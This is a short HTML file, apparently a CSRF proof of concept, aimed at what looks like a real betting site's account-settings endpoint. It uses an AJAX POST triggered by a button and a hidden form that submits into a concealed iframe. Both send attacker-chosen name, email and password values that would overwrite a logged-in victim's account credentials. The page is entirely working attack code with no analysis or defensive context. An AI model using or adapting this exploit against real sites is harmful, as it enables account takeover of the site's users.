<!DOCTYPE html>

<html>
	<head>
		<title>CSRF test</title>
	</head>
	
	<body>
		
	<button id="CSRF">JQueryH4x</button>
	
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
	<script>
	$(document).ready(function() {
		$("#CSRF").click(function() {
			$.ajax({
				type: "POST",
				//url: "http://neti.ee",
				url: "https://tokenbets.com/do/save_account",
				data: {av: 1, name: "Asshat", email: "asshat1335@mailinator.com", pass: "cssniper123", pass_conf: "cssniper123", qr: 0, secret: 0},
				success: function (data) {
                    try {
                        //var res = JSON.parse(data);
                        alert(data);
                    } catch (e) {alert(e);}
                },
                complete: function (jqXHR, textStatus) {
                    alert(textstatus);
                }
			});
				
		});
	});
	</script>
	<iframe style="display:none" name="hideCSRF"></iframe>
	<form method="post" action="https://www.tokenbets.com/do/save_account" target="hideCSRF">
		<input type="hidden" name="av" id="av" value="1">
		<input type="hidden" name="name" id="name" value="Asshat">
		<input type="hidden" name="email" id="email" value="asshat1335@mailinator.com">
		<input type="hidden" name="pass" id="pass" value="cssniper1">
		<input type="hidden" name="pass_conf" id="pass_conf" value="cssniper1">
		<input type="hidden" name="qr" id="qr" value="0">
		<input type="hidden" name="secret" id="secret" value="0">
		<input type="submit" value="FormH4x">
	</form>
	</body>

</html>
